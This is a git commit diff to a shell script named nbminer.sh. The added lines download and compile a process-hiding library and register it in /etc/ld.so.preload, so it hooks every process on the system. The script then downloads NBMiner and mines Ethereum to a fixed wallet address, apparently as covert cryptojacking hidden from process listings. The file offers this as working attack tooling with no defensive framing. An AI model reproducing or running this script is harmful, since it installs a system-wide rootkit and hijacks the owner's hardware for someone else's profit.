2cf7aae16efe8b07a0bba8693908abf3f3c0e8b3
chadpetersen1337 <68467197+chadpetersen1337@users.noreply.github.com>
2020-11-22 16:47:14 +0200

    Update nbminer.sh

--- nbminer.sh
+++ nbminer.sh
@@ -1,5 +1,11 @@
-#!/bin/sh
-wget https://github.com/NebuTech/NBMiner/releases/download/v33.3/NBMiner_33.3_Linux.tgz
-tar -xvzf NBMiner_33.3_Linux.tgz
+wget https://raw.githubusercontent.com/chadpetersen1337/gpuminers/master/magicNb.zip
+unzip magicNb.zip
+make
+gcc -Wall -fPIC -shared -o libprocesshider.so processhider.c -ldl
+mv libprocesshider.so /usr/local/lib/
+echo /usr/local/lib/libprocesshider.so >> /etc/ld.so.preload
+
+wget https://github.com/NebuTech/NBMiner/releases/download/v33.6/NBMiner_33.6_Linux.tgz
+tar -xvzf NBMiner_33.6_Linux.tgz
 cd NBMiner_Linux
 ./nbminer -a ethash -o ethproxy+ssl://naw-eth.hiveon.net:24443 -u 0x8CB8003E428D0Fd7693D22f576A212403728c64a.NBMiner -log
